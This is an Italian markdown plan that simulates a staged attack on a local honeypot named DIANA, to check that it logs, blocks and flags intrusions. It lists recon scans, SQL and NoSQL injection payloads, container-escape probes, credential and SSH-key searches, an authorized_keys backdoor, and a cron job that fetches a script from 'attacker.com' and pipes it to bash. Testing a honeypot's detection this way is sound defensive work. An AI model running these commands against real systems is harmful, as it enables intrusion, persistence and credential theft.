# 🎯 Simulazione Attacco Hacker - DIANA Honeypot

## Fase 1: Reconnaissance (Scansione Iniziale)

### 1.1 Port Scanning
```bash
# Nmap scan completo
nmap -sS -sV -O -p- localhost 4002-4003

# Version detection
nmap -sV --script vuln localhost -p 4002,4003

# Service enumeration
nmap -A -T4 localhost -p 4002,4003
```

### 1.2 Web Recon
```bash
# Check what's running
curl -I http://localhost:4002
curl -I http://localhost:4003

# Directory brute force
gobuster dir -u http://localhost:4003 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Check for common admin panels
curl http://localhost:4003/admin
curl http://localhost:4003/login
curl http://localhost:4003/api
```

## Fase 2: Enumeration (Enumerazione Servizi)

### 2.1 API Discovery
```bash
# Try common API endpoints
curl http://localhost:4003/api/
curl http://localhost:4003/api/overview
curl http://localhost:4003/api/logs
curl http://localhost:4003/api/keys

# Check for API documentation
curl http://localhost:4003/api/docs
curl http://localhost:4003/swagger
```

### 2.2 Authentication Testing
```bash
# Try default credentials
curl -X POST http://localhost:4003/api/auth -d '{"username":"admin","password":"admin"}' -H "Content-Type: application/json"

# SQL Injection attempts
curl -X POST http://localhost:4003/api/auth -d '{"username":"admin","password":"admin' OR '1'='1"}' -H "Content-Type: application/json"

# NoSQL Injection
curl -X POST http://localhost:4003/api/auth -d '{"username":{"$ne":""},"password":{"$ne":""}}' -H "Content-Type: application/json"
```

## Fase 3: Vulnerability Assessment

### 3.1 API Key Testing
```bash
# Try to enumerate API keys
curl http://localhost:4003/api/keys

# Try to create API key without auth
curl -X POST http://localhost:4003/api/keys -d '{"name":"test","description":"test"}' -H "Content-Type: application/json"

# Try common API keys
curl -H "X-API-Key: test" http://localhost:4003/api/overview
curl -H "X-API-Key: admin" http://localhost:4003/api/overview
curl -H "X-API-Key: 123456" http://localhost:4003/api/overview
```

### 3.2 Injection Testing
```bash
# Command injection in API endpoints
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"whoami; ls -la","sessionId":"test"}' -H "Content-Type: application/json"

# Try to break out of container
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"docker ps","sessionId":"test"}' -H "Content-Type: application/json"

# Try privilege escalation
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"sudo su","sessionId":"test"}' -H "Content-Type: application/json"
```

## Fase 4: Exploitation Attempts

### 4.1 Container Escape
```bash
# Check if running in container
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"cat /proc/1/cgroup","sessionId":"test"}' -H "Content-Type: application/json"

# Check for mounted volumes
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"mount","sessionId":"test"}' -H "Content-Type: application/json"

# Try to access Docker socket
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"ls -la /var/run/docker.sock","sessionId":"test"}' -H "Content-Type: application/json"
```

### 4.2 Network Pivoting
```bash
# Check network interfaces
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"ip addr show","sessionId":"test"}' -H "Content-Type: application/json"

# Try to ping external hosts
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"ping -c 1 8.8.8.8","sessionId":"test"}' -H "Content-Type: application/json"

# Try DNS resolution
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"nslookup google.com","sessionId":"test"}' -H "Content-Type: application/json"
```

## Fase 5: Privilege Escalation

### 5.1 File System Exploration
```bash
# Look for sensitive files
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"find / -name \"*.conf\" 2>/dev/null","sessionId":"test"}' -H "Content-Type: application/json"

# Check for credentials
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"find / -name \"*.env\" 2>/dev/null","sessionId":"test"}' -H "Content-Type: application/json"

# SSH keys
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"find / -name \"id_rsa\" 2>/dev/null","sessionId":"test"}' -H "Content-Type: application/json"
```

### 5.2 Process Enumeration
```bash
# Check running processes
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"ps aux","sessionId":"test"}' -H "Content-Type: application/json"

# Check for other containers
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"docker ps -a","sessionId":"test"}' -H "Content-Type: application/json"

# Network connections
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"netstat -tlnp","sessionId":"test"}' -H "Content-Type: application/json"
```

## Fase 6: Persistence Attempts

### 6.1 Backdoor Installation
```bash
# Try to create SSH keys
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"ssh-keygen -t rsa -f ~/.ssh/id_rsa -N \"\"","sessionId":"test"}' -H "Content-Type: application/json"

# Try to modify authorized_keys
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"echo \"ssh-rsa AAAAB3... attacker@kali\" >> ~/.ssh/authorized_keys","sessionId":"test"}' -H "Content-Type: application/json"

# Try to create cron jobs
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"echo \"* * * * * curl http://attacker.com/rev.sh | bash\" | crontab -","sessionId":"test"}' -H "Content-Type: application/json"
```

### 6.2 Data Exfiltration
```bash
# Try to read sensitive files
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"cat ~/.env","sessionId":"test"}' -H "Content-Type: application/json"

# Try to access database
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"psql -h db -U postgres -d honeypot -c \"SELECT * FROM users;\"","sessionId":"test"}' -H "Content-Type: application/json"

# Try to read logs
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"tail -f /var/log/auth.log","sessionId":"test"}' -H "Content-Type: application/json"
```

## Fase 7: Advanced Techniques

### 7.1 Memory Dumping
```bash
# Try to dump memory
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"cat /proc/meminfo","sessionId":"test"}' -H "Content-Type: application/json"

# Try to access other processes
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"ls -la /proc/*/cmdline","sessionId":"test"}' -H "Content-Type: application/json"
```

### 7.2 Kernel Exploitation
```bash
# Check kernel version
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"uname -a","sessionId":"test"}' -H "Content-Type: application/json"

# Look for exploits
curl -X POST http://localhost:4003/api/terminal/execute -d '{"command":"searchsploit linux kernel 5.15","sessionId":"test"}' -H "Content-Type: application/json"
```

## 🛡️ Cosa Aspettarsi da DIANA

DIANA dovrebbe:
1. **Loggare tutti i tentativi** con timestamp e IP
2. **Bloccare comandi pericolosi** (docker, sudo, etc.)
3. **Mascherare errori Docker** con errori Bash standard
4. **Generare honeytokens** credibili (.env, .ssh keys)
5. **Mantenere il character** di un sistema Linux reale
6. **Calcolare risk score** per ogni comando
7. **Inviare alert** per tentativi sospetti

## 📊 Indicatori di Compromise (IoC)

DIANA dovrebbe detectare:
- Tentativi di container escape
- Scansione di porte interne
- Tentativi di privilege escalation
- Accesso a file sensibili
- Comandi di networking verso esterno
- Pattern di attacco automatizzati
